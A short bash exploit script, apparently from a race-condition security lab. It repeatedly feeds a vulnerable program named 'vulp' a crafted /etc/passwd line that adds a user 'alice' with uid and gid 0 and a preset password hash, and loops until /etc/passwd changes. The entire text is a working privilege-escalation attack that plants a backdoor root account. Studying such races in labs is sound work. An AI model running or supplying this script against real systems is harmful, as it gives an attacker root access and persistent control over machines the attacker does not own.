#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]
do
    echo "alice:U6aMy0wojraho:0:0:::" | ./vulp
    new=$($CHECK_FILE)
done
echo "Changed!"
